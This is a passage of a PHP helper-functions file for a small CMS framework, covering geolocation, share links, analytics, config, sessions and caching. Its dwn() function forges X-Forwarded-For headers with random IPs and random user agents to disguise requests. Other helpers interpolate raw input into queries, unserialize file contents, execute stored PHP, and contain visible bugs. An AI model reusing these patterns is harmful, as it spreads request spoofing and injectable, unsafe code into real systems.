<?php
    if (!function_exists('infosIP')) {
        function infosIP($localhost = false)
        {
            $session = session('web');
            $infosIP = $session->getInfosIp();
            if (empty($infosIP)) {
                $ip = $_SERVER["REMOTE_ADDR"];
                if (true === $localhost) {
                    $url = "http://ip-api.com/json";
                } else {
                    $url = "http://ip-api.com/json/$ip";
                }
                $json = dwn($url);
                $json = str_replace(
                    array(
                        'query',
                        'countryCode',
                        'regionName'
                    ),
                    array(
                        'ip',
                        'country_code',
                        'region_name'
                    ),
                    $json
                );
                $infos = json_decode($json, true);
                if (is_array($infos)) {
                    if (ake('status', $infos)) {
                        if ($infos['status'] == 'fail') {
                            return infosIP(true);
                        }
                    }
                    $InfosIp = o("IP");
                    $InfosIp->populate($infos);
                    $session->setInfosIp($InfosIp);
                }
            }
            return $infosIP;
        }
    }

    if (!function_exists('params')) {
        function params($args = array())
        {
            $params = array();
            if (count($args)) {
                foreach ($args as $k => $arg) {
                    $num = $k + 1;
                    $key = 'param' . $num;
                    $params[$key] = $arg;
                }
            }
            return $params;
        }
    }

    if (!function_exists('cdn')) {
        function cdn($file)
        {
            return 'http://web.gpweb.co/u/45880241/cdn/' . $file;
        }
    }

    if (!function_exists('can')) {
        function can($type, $action)
        {
            $action     = \Thin\Inflector::lower($action);
            $type       = \Thin\Inflector::lower($type);
            $session    = session('admin');
            $user       = $session->getUser();
            if (ake($type, \Thin\Data::$_fields) && ake($type, \Thin\Data::$_rights) && null !== $user) {
                $rights = \Thin\Data::$_rights[$type];
                if (ake($action, $rights)) {
                    return $rights[$action];
                }
            }
            return false;
        }
    }

    if (!function_exists('o')) {
        function o($name)
        {
            $objects = Thin\Utils::get('thinObjects');
            if (null === $objects) {
                $objects = array();
            }
            if (ake($name, $objects)) {
                return $objects[$name];
            }
            $newObj = new Thin\Container;
            $newObj->setIsThinObject($name);
            $objects[$name] = $newObj;
            Thin\Utils::set('thinObjects', $objects);
            return $newObj;
        }
    }

    if (!function_exists('isAke')) {
        function isAke($tab, $key, $default = array())
        {
            return array_key_exists($key, $tab) ? $tab[$key] : $default;
        }
    }

    if (!function_exists('f')) {
        function f()
        {
            $args = func_get_args();
            if (0 < count($args)) {
                $closure = array_shift($args);
                if(is_callable($closure)) {
                    return call_user_func_array($closure, $args);
                }
            }
            return null;
        }
    }

    if (!function_exists('setArrayXpathValue')) {
        /**
         * Set value of an array by using "root/branch/leaf" notation
         *
         * @param array $array Array to affect
         * @param string $path Path to set
         * @param mixed $value Value to set the target cell to
         * @return void
         */
        function setArrayXpathValue(array &$array, $path, $value, $delimiter = '/')
        {
            // fail if the path is empty
            if (empty($path)) {
                throw new Exception('Path cannot be empty');
            }

            // fail if path is not a string
            if (!is_string($path)) {
                throw new Exception('Path must be a string');
            }

            // remove all leading and trailing delimiters
            $path = trim($path, $delimiter);

            // split the path in into separate parts
            $parts = explode($delimiter, $path);

            // initially point to the root of the array
            $pointer =& $array;

            // loop through each part and ensure that the cell is there
            foreach ($parts as $part) {
                // fail if the part is empty
                if (empty($part)) {
                    throw new Exception('Invalid path specified: ' . $path);
                }

                // create the cell if it doesn't exist
                if (!isset($pointer[$part])) {
                    $pointer[$part] = array();
                }

                // redirect the pointer to the new cell
                $pointer =& $pointer[$part];
            }

            // set value of the target cell
            $pointer = $value;
        }
    }

    if (!function_exists('cms_ga')) {
        function cms_ga($account, $domain = null, $echo = true)
        {
            if (empty($domain)) {
                $domain = $_SERVER['SERVER_NAME'];
            }

            $html = '<script type="text/javascript">
var _gaq=_gaq||[];
_gaq.push([\'_setAccount\', \'' . $account . '\']);
_gaq.push([\'_setDomainName\', \'' . $domain . '\']);
_gaq.push([\'_trackPageview\']);
(function(){
var ga=document.createElement(\'script\');ga.type=\'text/javascript\';ga.async=true;
ga.src=(\'https:\'==document.location.protocol?\'https://ssl\':\'http://www\')+\'.google-analytics.com/ga.js\';
var s=document.getElementsByTagName(\'script\')[0];s.parentNode.insertBefore(ga,s);
})();
</script>';
            if (true === $echo) {
                echo $html;
            } else {
                return $html;
            }
        }
    }

    if (!function_exists('cms_hook')) {
        function cms_hook()
        {
            return call(func_get_args());
        }
    }

    if (!function_exists('cms_facebook')) {
        function cms_facebook($echo = true)
        {
            $urlPage = getUrl();
            $url     = 'http://www.facebook.com/sharer.php?u=' . $urlPage . '&amp;t=' . urlencode(cms_translate('title'));

            if (true === $echo) {
                echo $url;
            } else {
                return $url;
            }
        }
    }

    if (!function_exists('cms_twitter')) {
        function cms_twitter($echo = true)
        {
            $urlPage            = getUrl();
            $twitterAccount     = cms_option('twitter_account');
            if (empty($twitterAccount)) {
                $twitterAccount = 'thinCMS';
            }
            $url = 'http://twitter.com/share?url=' . $urlPage . '&amp;text=' . urlencode(cms_translate('title')) . '&amp;via=' . $twitterAccount;

            if (true === $echo) {
                echo $url;
            } else {
                return $url;
            }
        }
    }

    if (!function_exists('cms_linkedin')) {
        function cms_linkedin($echo = true)
        {
            $urlPage            = getUrl();
            $linkedinAccount    = cms_option('linkedin_account');
            if (empty($linkedinAccount)) {
                $linkedinAccount = 'thinCMS';
            }
            $url = 'https://www.linkedin.com/shareArticle?url=' . $urlPage . '&amp;title=' . urlencode(cms_translate('title')) . '&amp;source=' . $linkedinAccount;

            if (true === $echo) {
                echo $url;
            } else {
                return $url;
            }
        }
    }

    if (!function_exists('cms_translate')) {
        function cms_translate($field)
        {
            $page   = container()->getCmsPage();
            $getter = getter($field);
            $value  = $page->$getter();
            return \Thin\Cms::lng($value);
        }
    }

    if (!function_exists('cms_partial')) {
        function cms_partial($name, $params = array(), $echo = true)
        {
            $query      = new \Thin\Querydata('partial');
            $res        = $query->where("name = $key")->get();
            if (count($res)) {
                $row    = $query->first($res);
                $html   = \Thin\Cms::executePHP($row->getValue());

                if (count($params)) {
                    foreach ($params as $k => $v) {
                        $needle = '##' . $k . '##';
                        $html = repl($needle, $v, $html);
                    }
                }

                if (true === $echo) {
                    echo $html;
                } else {
                    return $html;
                }
            }
            return null;
        }
    }

    if (!function_exists('cms_language')) {
        function cms_language()
        {
            return container()->getCmsLanguage();
        }
    }

    if (!function_exists('cms_url_theme')) {
        function cms_url_theme()
        {
            $theme = \Thin\Cms::getOption('theme');
            return URLSITE . 'themes/' . $theme;
        }
    }

    if (!function_exists('cms_url_page')) {
        function cms_url_page($page = null)
        {
            if (null === $page) {
                return getUrl();
            } else {
                $query = new \Thin\Querydata('page');
                $res = $query->where("name = $page")->get();
                if (count($res)) {
                    $page = $query->first($res);
                } else {
                    return URLSITE . $page;
                }
            }
            return URLSITE . $page->getUrl();
        }
    }

    if (!function_exists('cms_snippet')) {
        function cms_snippet($name, $params = array(), $echo = true)
        {
            $snippet = \Thin\Cms::execSnippet($name, $params);
            if (true === $echo) {
                echo $snippet;
            } else {
                return $snippet;
            }
        }
    }

    if (!function_exists('cms_object')) {
        function cms_object($collection, $objectName, $array = false)
        {
            $object = new cmsObj();
            $q      = new \Thin\Querydata('collection');
            $res    = $q->where('name = ' . $collection)->get();
            if (count($res)) {
                $row  = $q->first($res);
                $q    = new \Thin\Querydata('object');
                $res  = $q->where('collection = ' . $row->getId())->whereAnd("name = $objectName")->get();
                if (count($res)) {
                    $obj        = $q->first($res);
                    $objectLng  = \Thin\Cms::lng($obj->getValue());
                    $ini        = parse_ini_string($objectLng, true);
                    $object->populate($ini);
                }
            }
            return $object;
        }
    }

    if (!function_exists('cms_objects')) {
        function cms_objects($collection, $array = false)
        {
            $coll   = array();
            $q      = new \Thin\Querydata('collection');
            $res    = $q->where('name = ' . $collection)->get();
            if (count($res)) {
                $row        = $q->first($res);
                $q          = new \Thin\Querydata('object');
                $objects    = $q->where('collection = ' . $row->getId())->get();
                if (count($objects)) {
                    foreach ($objects as $object) {
                        $objectLng  = \Thin\Cms::lng($object->getValue());
                        $ini        = parse_ini_string($objectLng, true);
                        if (true === $array) {
                            array_push($coll, $ini);
                        } else {
                            $obj = new cmsObj();
                            $obj->populate($ini);
                            array_push($coll, $obj);
                        }
                    }
                }
            }
            return $coll;
        }
    }

    if (!function_exists('cms_option')) {
        function cms_option($option)
        {
            return \Thin\Cms::getOption($option);
        }
    }

    if (!function_exists('cms_translate')) {
        function cms_translate($key, $params = array(), $default = null)
        {
            return \Thin\Cms::translate($key, $params, $default);
        }
    }

    if (!function_exists('arrayXpathValue')) {
        /**
         * Get value of an array by using "root/branch/leaf" notation
         *
         * @param array $array   Array to traverse
         * @param string $path   Path to a specific option to extract
         * @param mixed $default Value to use if the path was not found
         * @return mixed
         */
        function arrayXpathValue(array $array, $path, $default = null, $delimiter = '/')
        {
            // fail if the path is empty
            if (empty($path)) {
                throw new Exception('Path cannot be empty');
            }

            // fail if path is not a string
            if (!is_string($path)) {
                throw new Exception('Path must be a string');
            }

            // remove all leading and trailing delimiters
            $path = trim($path, $delimiter);

            // use current array as the initial value
            $value = $array;

            // extract parts of the path
            $parts = explode($delimiter, $path);

            // loop through each part and extract its value
            foreach ($parts as $part) {
                if (isset($value[$part])) {
                    // replace current value with the child
                    $value = $value[$part];
                } else {
                    // key doesn't exist, fail
                    return $default;
                }
            }

            return $value;
        }
    }

    if (!function_exists('humanize')) {
        function humanize($word, $key)
        {
            return strtolower($word) . str_replace(' ', '', ucwords(str_replace('_', ' ', $key)));
        }
    }

    if (!function_exists('setter')) {
        function setter($key)
        {
            return humanize('set', $key);
        }
    }

    if (!function_exists('getter')) {
        function getter($key)
        {
            return humanize('get', $key);
        }
    }

    if (!function_exists('font')) {
        function font(
            $text = 'OK',
            $font = 'fb82491021a73de6ab8ee73cee1be93d',
            $size = 50,
            $fg = '000000',
            $bg = 'ffffff',
            $width = 700
        ) {
            $url = "http://renderer.fontshop.com/fonts/font_rend.php?idt=f&id=$font&rs=$size&fg=$fg&bg=$bg&rt=$text&ls=$size&w=$width&t=pc";
            $key = sha1(serialize(func_get_args()));
            $file = CACHE_PATH . DS . $key . '.png';
            if (!\Thin\File::exists($file)) {
                $img = fgc($url);
                file_put_contents($file, $img);
            }

            return URLSITE . 'file.php?file=' . $key . '&type=png&name=image';
        }

        function info($what = null, $die = false)
        {
            if (null === $what) {
                $what = request();
            }
            new \Thin\Info($what);
            if (true === $die) {
                exit;
            }
        }

        function displayWebAddress($http)
        {
            $http = repl('http://', '', $http);
            $http = repl('https://', '', $http);

            $tab = explode('/', $http);
            return 'http://' . current($tab);
        }

        function getRandomUserAgent()
        {
            $v = rand(1, 4) . '.' . rand(0, 9);
            $a = rand(0, 9);
            $b = rand(0, 99);
            $c = rand(0, 999);

            $userAgents = array(
                "Mozilla/5.0 (Linux; U; Android $v; fr-fr; Nexus One Build/FRF91) AppleWebKit/5$b.$c (KHTML, like Gecko) Version/$a.$a Mobile Safari/5$b.$c",
                "Mozilla/5.0 (Linux; U; Android $v; fr-fr; Dell Streak Build/Donut AppleWebKit/5$b.$c+ (KHTML, like Gecko) Version/3.$a.2 Mobile Safari/ 5$b.$c.1",
                "Mozilla/5.0 (Linux; U; Android 4.$v; fr-fr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
                "Mozilla/5.0 (Linux; U; Android 4.$v; fr-fr; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
                "Mozilla/5.0 (Linux; U; Android $v; en-gb) AppleWebKit/999+ (KHTML, like Gecko) Safari/9$b.$a",
                "Mozilla/5.0 (Linux; U; Android $v.5; fr-fr; HTC_IncredibleS_S710e Build/GRJ$b) AppleWebKit/5$b.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/5$b.1",
                "Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; HTC Vision Build/GRI$b) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android $v.4; fr-fr; HTC Desire Build/GRJ$b) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android $v.3; fr-fr; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari",
                "Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/5$b.1",
                "Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/5$b.1",
                "Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; HTC_DesireS_S510e Build/GRI$a) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/$c.1",
                "Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile",
                "Mozilla/5.0 (Linux; U; Android $v.3; fr-fr; HTC Desire Build/GRI$a) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.$v; fr-fr; HTC Desire Build/FRF$a) AppleWebKit/533.1 (KHTML, like Gecko) Version/$a.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android $v; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/$a.$a Mobile Safari/$c.$a",
                "Mozilla/5.0 (Linux; U; Android $v; fr-fr; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android $v.1; fr-fr; HTC_DesireZ_A7$c Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/$c.$a",
                "Mozilla/5.0 (Linux; U; Android $v.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/$c.1",
                "Mozilla/5.0 (Linux; U; Android $v; fr-fr; LG-P5$b Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
            );

            return $userAgents[rand(0, count($userAgents) - 1)];
        }

        function dwn($url)
        {
            $ip         = rand(0, 255) . '.' . rand(0, 255) . '.' . rand(0, 255) . '.' . rand(0, 255);
            $userAgent  = getRandomUserAgent();
            $ch         = curl_init();

            $headers    = array();

            curl_setopt($ch, CURLOPT_URL,       $url);
            curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);

            $headers[] = "REMOTE_ADDR: $ip";
            $headers[] = "HTTP_X_FORWARDED_FOR: $ip";

            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

            $result     = curl_exec($ch);
            curl_close ($ch);
            return $result;
        }
    }

    if (!function_exists('twitter')) {
        function twitter(array $config)
        {
            extract($config);
            $link = 'https://twitter.com/intent/tweet?original_referer=' . urlencode($original_referer) . '&amp;related=' . urlencode($related) . '&amp;text=%22' . urlencode($text) . '%22&amp;tw_p=tweetbutton&url=' . urlencode($url) . '&amp;via=' . urlencode($via);
            return $link;
        }
    }

    if (!function_exists('dataDecode')) {
        function dataDecode($file)
        {
            if (file_exists($file)) {
                if (is_readable($file)) {
                    return unserialize(file_get_contents($file));
                }
            }
            return new Obj;
        }
    }

    if (!function_exists('facebook')) {
        function facebook(array $config)
        {
            extract($config);
            $link = 'http://www.facebook.com/sharer/sharer.php?s=100&amp;p[url]=' . urlencode($url) . '&amp;p[images][0]=' . urlencode($image) . '&amp;p[title]=' . urlencode($title) . '&amp;p[summary]=' . urlencode($summary);
            return $link;
        }
    }

    if (!function_exists('with')) {
        /**
         * Return the given object. Useful for chaining.
         *
         * @param mixed $object
         * @return mixed
         */
        function with($object)
        {
            return $object;
        }
    }

    if (!function_exists('contain')) {
        function contain($needle, $string)
        {
            $needle = \Thin\Inflector::lower(htmlspecialchars_decode($needle));
            $string = \Thin\Inflector::lower(htmlspecialchars_decode($string));
            return strstr($string, $needle) ? true : false;
        }
    }

    if (!function_exists('thinVar')) {
        function thinVar()
        {
            static $vars = array();
            $args = func_get_args();
            $numArgs = func_num_args();
            if (1 == $numArgs) {
                if (ake(current($args), $vars)) {
                    return $vars[current($args)];
                }
            } else if (2 == $numArgs) {
                $vars[current($args)] = end($args);
                return end($args);
            }
            return null;
        }

        function setvar($name, $value)
        {
            return thinVar($name, $value);
        }

        function getvar($name)
        {
            return thinVar($name);
        }

        function setEvent($name, $event, $priority = 0)
        {
            $events = container()->getEvents();
            if (null === $events) {
                $events         = array();
                $events[$name]  = array();
            }
            $events[$name][$priority] = $event;
            container()->setEvents($events);
        }

        function runEvent($name, $params = array())
        {
            $res = '';
            $events = container()->getEvents();
            if (null !== $events) {
                if (is_array($events)) {
                    if (ake($name, $events)) {
                        if (is_array($events[$name])) {
                            for ($i = 0 ; $i < count($events[$name]) ; $i++) {
                                $func = $events[$name][$i];
                                if ($func instanceof \Closure) {
                                    $res .= call_user_func_array($func, $params);
                                }
                            }
                        }
                    }
                }
            }
            return $res;
        }
    }

    if (!function_exists('partial')) {
        function partial($file)
        {
            if (strstr($file, 'http://')) {
                $content = fgc($file);
                $file = CACHE_PATH . DS . sha1($file) . '.html';
                file_put_contents($file, $content);
            }
            if (\Thin\File::exists($file)) {
                $view = new \Thin\View($file);
                $view->render();
            }
        }
    }

    if (!function_exists('newObj')) {
        function newObj($class)
        {
            if (!class_exists($class)) {
                class_alias('Thin\\Container', $class);
            }
            return new $class;
        }
    }

    if (!function_exists('createSerializedObject')) {
        function createSerializedObject($className)
        {
            $reflection = new \ReflectionClass($className);
            $properties = $reflection->getProperties();

            return "O:" . strlen($className) . ":\"" . $className. "\":" . count($properties) . ':{' . serializeProperties($reflection, $properties) ."}";
        }

        function instantiator($className)
        {
            return unserialize(createSerializedObject($className));
        }

        function serializeProperties(\ReflectionClass $reflection, array $properties)
        {
            $serializedProperties = '';

            foreach ($properties as $property) {
                $serializedProperties .= serializePropertyName($reflection, $property);
                $serializedProperties .= serializePropertyValue($reflection, $property);
            }

            return $serializedProperties;
        }

        function serializePropertyName(\ReflectionClass $class, \ReflectionProperty $property)
        {
            $propertyName = $property->getName();

            if ($property->isProtected()) {
                $propertyName = chr(0) . '*' . chr(0) . $propertyName;
            } elseif ($property->isPrivate()) {
                $propertyName = chr(0) . $class->getName() . chr(0) . $propertyName;
            }

            return serialize($propertyName);
        }

        function serializePropertyValue(\ReflectionClass $class, \ReflectionProperty $property)
        {
            $defaults = $class->getDefaultProperties();

            if (ake($property->getName(), $defaults)) {
                return serialize($defaults[$property->getName()]);
            }

            return serialize(null);
        }

        function callNotPublicMethod($object, $methodName)
        {
            $reflectionClass = new \ReflectionClass($object);
            $reflectionMethod = $reflectionClass->getMethod($methodName);
            $reflectionMethod->setAccessible(true);

            $params = array_slice(func_get_args(), 2);
            return $reflectionMethod->invokeArgs($object, $params);
        }

        function transaction($class, $method)
        {
            $transactions = container()->getThinTransactions();
            if (null === $transactions) {
                $transactions = array();
            }
            $params = array_slice(func_get_args(), 2);
            array_push($transactions, array($class, $method, $params));
            container()->setThinTransactions($transactions);
        }

        function commit()
        {
            $transactions = container()->getThinTransactions();
            if (null !== $transactions) {
                if (is_array($transactions)) {
                    if (count($transactions)) {
                        foreach (static::$_transactions as $transaction) {
                            list($class, $method, $params) = $transaction;
                            $commit = call_user_func_array(array($class, $method), $params);
                        }
                    }
                }
            }
        }

        function showException($e)
        {
            $code = $e->getCode();
            $file = $e->getFile();
            $line = $e->getLine();
            $date = date('M d, Y h:iA');
            echo '<style>.error {font-weight: bold; color: red; width: 30%; padding: 10px; margin: 10px; border: solid 1px red;}</style>';
            echo "Thin has caught an exception: ";
            $html = "<p>
            <strong>Date:</strong> {$date}
         </p>

         <p>
            <strong>Message:</strong>
            <div class=error>{$e->getMessage()}</div>
         </p>

         <p>
            <strong>Code:</strong> {$code}
         </p>

         <p>
            <strong>File:</strong> {$file}
         </p>

         <p>
            <strong>Line:</strong> {$line}
         </p>

         <h3>Stack trace:</h3>";
         echo $html;
            echo '<pre style="padding: 5px;">';
            echo $e->getTraceAsString();
            echo '</pre>';
        }
    }

    if (!function_exists('url')) {
        function url()
        {
            $protocol = 'http';
            if ($_SERVER['SERVER_PORT'] == 443 || (!empty($_SERVER['HTTPS']) && \Thin\Inflector::lower($_SERVER['HTTPS']) == 'on')) {
                $protocol .= 's';
                $protocol_port = $_SERVER['SERVER_PORT'];
            } else {
                $protocol_port = 80;
            }

            $host = $_SERVER['HTTP_HOST'];
            $port = $_SERVER['SERVER_PORT'];
            $request = $_SERVER['REQUEST_URI'];
            return dirname($protocol . '://' . $host . ($port == $protocol_port ? '' : ':' . $port) . $request);
        }
    }

    if (!function_exists('byPeople')) {
        function byPeople($product)
        {
            return (1 == $product->getByPeople()) ? true : false;
        }
    }

    if (!function_exists('getUrl')) {
        function getUrl()
        {
            $urlsite = trim(URLSITE, '/');
            return $urlsite . $_SERVER['REQUEST_URI'];
        }
    }

    if (!function_exists('helper')) {
        function helper($helper)
        {
            $file = APPLICATION_PATH . DS . 'helpers' . DS . ucfirst(\Thin\Inflector::lower($helper)) . '.php';
            if (file_exists($file)) {
                require_once $file;
                $class = 'Thin\\Helper\\' . ucfirst(\Thin\Inflector::lower($helper));
                return new $class;
            }
            return null;
        }
    }

    if (!function_exists('service')) {
        function service($service)
        {
            $file = APPLICATION_PATH . DS . 'services' . DS . ucfirst(\Thin\Inflector::lower($service)) . '.php';
            if (file_exists($file)) {
                require_once $file;
                $class = 'Thin\\Service\\' . ucfirst(\Thin\Inflector::lower($service));
                return new $class;
            }
            return null;
        }
    }

    if (!function_exists('plugin')) {
        function plugin($plugin)
        {
            $file = APPLICATION_PATH . DS . 'plugins' . DS . ucfirst(\Thin\Inflector::lower($plugin)) . '.php';
            if (file_exists($file)) {
                require_once $file;
                $class = 'Thin\\Plugin\\' . ucfirst(\Thin\Inflector::lower($plugin));
                return new $class;
            }
            return null;
        }
    }

    if (!function_exists('isPhp')) {
        function isPhp($version = '5.0.0')
        {
            static $_isPhp;
            $version = (string) $version;

            if (!ake($version, $_isPhp)) {
                $_isPhp[$version] = (version_compare(PHP_VERSION, $version) < 0) ? false : true;
            }

            return $_isPhp[$version];
        }
    }

    if (!function_exists('setHeaderStatus')) {
        function setHeaderStatus($code = 200, $text = '')
        {
            $stati = array(
                200 => 'OK',
                201 => 'Created',
                202 => 'Accepted',
                203 => 'Non-Authoritative Information',
                204 => 'No Content',
                205 => 'Reset Content',
                206 => 'Partial Content',

                300 => 'Multiple Choices',
                301 => 'Moved Permanently',
                302 => 'Found',
                304 => 'Not Modified',
                305 => 'Use Proxy',
                307 => 'Temporary Redirect',

                400 => 'Bad Request',
                401 => 'Unauthorized',
                403 => 'Forbidden',
                404 => 'Not Found',
                405 => 'Method Not Allowed',
                406 => 'Not Acceptable',
                407 => 'Proxy Authentication Required',
                408 => 'Request Timeout',
                409 => 'Conflict',
                410 => 'Gone',
                411 => 'Length Required',
                412 => 'Precondition Failed',
                413 => 'Request Entity Too Large',
                414 => 'Request-URI Too Long',
                415 => 'Unsupported Media Type',
                416 => 'Requested Range Not Satisfiable',
                417 => 'Expectation Failed',

                500 => 'Internal Server Error',
                501 => 'Not Implemented',
                502 => 'Bad Gateway',
                503 => 'Service Unavailable',
                504 => 'Gateway Timeout',
                505 => 'HTTP Version Not Supported'
            );

            if ($code == '' || ! is_numeric($code)) {
                throw new Exception('Status codes must be numeric');
            }

            if (isset($stati[$code]) && $text == '') {
                $text = $stati[$code];
            }

            if ($text == '') {
                throw new Exception('No status text available.  Please check your status code number or supply your own message text.');
            }

            $serverProtocol = (isset($_SERVER['SERVER_PROTOCOL'])) ? $_SERVER['SERVER_PROTOCOL'] : false;

            if (substr(php_sapi_name(), 0, 3) == 'cgi') {
                header("Status: {$code} {$text}", true);
            } elseif ($serverProtocol == 'HTTP/1.1' || $serverProtocol == 'HTTP/1.0') {
                header($serverProtocol . " {$code} {$text}", true, $code);
            } else {
                header("HTTP/1.1 {$code} {$text}", true, $code);
            }
        }
    }
    if (!function_exists('email')) {
        function email()
        {
            if (!class_exists('ThinEmail')) {
                eval('class ThinEmail extends Thin\\Container {public function send(){return Thin\\Utils::mail(parent::getTo(), parent::getSubject(), parent::getBody(), parent::getHeaders());}}');
            }
            return new ThinEmail;
        }

        function smtp($to, $from, $subject, $body, $html = true)
        {
            $mail = new \Thin\Smtp();
            $mail->to($to)->from($from)->subject($subject);
            if (true === $html) {
                $result = $mail->body($body)->send();
            } else {
                $result = $mail->text($body)->sendText();
            }
            return $result;
        }
    }

    if (!function_exists('config')) {
        /* ex: config('app.encoding');*/
        function config()
        {
            $args = func_get_args();
            if (!count($args)) {
                return container()->getConfig();
            }
            if (1 == count($args)) {
                $getter = getter(\Thin\Arrays::first($args));
                return container()->getConfig()->$getter();
            }
            if (2 == count($args)) {
                $key    = \Thin\Arrays::first($args);
                $value  = \Thin\Arrays::last($args);
                $setter = setter($key);
                container()->getConfig()->$setter($value);
                return $value;
            }
            return null;
        }
    }

    if (!function_exists('hook')) {
        function hook()
        {
            return new Hook;
        }
    }

    if (!function_exists('hr')) {
        function hr($str)
        {
            echo $str . '<hr />';
        }
    }
    if (!function_exists('addEav')) {
        function addEav($entity, array $attributes)
        {
            $eav = \Thin\Utils::newInstance('Memory', array('Thin', 'EAV'));
            $eav = $eav->setEntity($entity);
            foreach ($attributes as $key => $value) {
                $setter = setter($key);
                $eav = $eav->$setter($value);
            }
            return $eav->save();
        }
    }
    if (!function_exists('form')) {
        function form($form) {
            return \Thin\Utils::getInstance('ThinForm_' . $form);
        }
    }

    if (!function_exists('addError')) {
        function addError($error, $type = "warning")
        {
            $type   = \Thin\Inflector::lower($type);
            $errors = \Thin\Utils::get('thinErrors');
            $errors = (empty($errors)) ? array() : $errors;
            if (!ake($type, $errors)) {
                $errors[$type] = array();
            }
            $errors[$type] = $error;
            \Thin\Utils::set('thinErrors', $errors);
        }
    }

    if (!function_exists('getErrors')) {
        function getErrors($type = null)
        {
            $errors = \Thin\Utils::get('thinErrors');
            $errors = (empty($errors)) ? array() : $errors;
            if (null !== $type) {
                $type = \Thin\Inflector::lower($type);
                if (ake($type, $errors)) {
                    return $errors[$type];
                }
            }

            return $errors;
        }
    }

    if (!function_exists('error')) {
        function error($error)
        {
            return \Thin\Exception($error);
        }
    }

    if (!function_exists('session')) {
        function session($name)
        {
            return \Thin\Session::instance($name);
        }
    }

    if (!function_exists('isRole')) {
        function isRole($role)
        {
            $role = em(config('app.roles.entity'), config('app.roles.table'))->findByLabel($role);
            if (null === $role) {
                return false;
            }
            return $role->getLabel() == \Thin\Utils::get('appRole')->getLabel();
        }
    }
    if (!function_exists('role')) {
        function role($role)
        {
            return em(config('app.roles.entity'), config('app.roles.table'))->findByLabel($role);
        }
    }
    if (!function_exists('render')) {
        function render($file)
        {
            return \Thin\Utils::run('view.render', array('hash' => sha1($file)));
        }
    }
    if (!function_exists('arrayLookup')) {
        function arrayLookup($a, $b)
        {
            return array_flip(array_intersect(array_flip($a), array_keys($b)));
        }
    }

    if (!function_exists('contents')) {
        function contents($file)
        {
            return file_get_contents($file);
        }
    }

    if (!function_exists('utils')) {
        function utils()
        {
            return \Thin\Utils::getInstance('Utils');
        }
    }

    if (!function_exists('u')) {
        function u()
        {
            return \Thin\Utils::getInstance('Utils');
        }
    }

    if (!function_exists('s')) {
        function s($name)
        {
            return session($name);
        }
    }

    if (!function_exists('e')) {
        function e($exception)
        {
            return \Thin\Utils::newInstance('Exception', array($exception));
        }
    }

    if (!function_exists('i')) {
        function i()
        {
            return \Thin\Utils::getInstance('Inflector');
        }
    }

    if (!function_exists('memory')) {
        function memory($entity, $table)
        {
            return new \Thin\Memory($entity, $table);
        }
    }

    if (!function_exists('em')) {
        function em($entity, $table)
        {
            $class = 'Model_' . \Thin\Inflector::lower($entity) . '_' . \Thin\Inflector::lower($table);
            return new $class;
        }
    }

    if (!function_exists('cache')) {
        function cache($key, $value, $duration = 60, array $params = array())
        {
            $suffix = (strstr($key, 'sql')) ? '_SQL' : '';
            $cache = new \Thin\Cache(CACHE_PATH . DS);
            $hash = sha1($key . $duration . _serialize($params)) . $suffix . '.cache';
            return $cache->remember($hash, $value, $duration);
        }
    }

    if (!function_exists('isCached')) {
        function isCached($key, $duration = 60, array $params = array())
        {
            $suffix = (strstr($key, 'sql')) ? '_SQL' : '';
            $cache = new \Thin\Cache(CACHE_PATH . DS);
            $hash = sha1($key . $duration . _serialize($params)) . $suffix . '.cache';
            return $cache->has($hash);
        }
    }

    if (!function_exists('duration')) {
        function duration($ts, $time = null)
        {
            if (empty($time)) {
                $time = time();
            }
            $years  = (int) ((($time - $ts) / (7 * 86400)) / 52.177457);
            $rem    = (int) (($time - $ts) - ($years * 52.177457 * 7 * 86400));
            $weeks  = (int) (($rem) / (7 * 86400));
            $days   = (int) (($rem) / 86400) - $weeks * 7;
            $hours  = (int) (($rem) / 3600) - $days * 24 - $weeks * 7 * 24;
            $mins   = (int) (($rem) / 60) - $hours * 60 - $days * 24 * 60 - $weeks * 7 * 24 * 60;
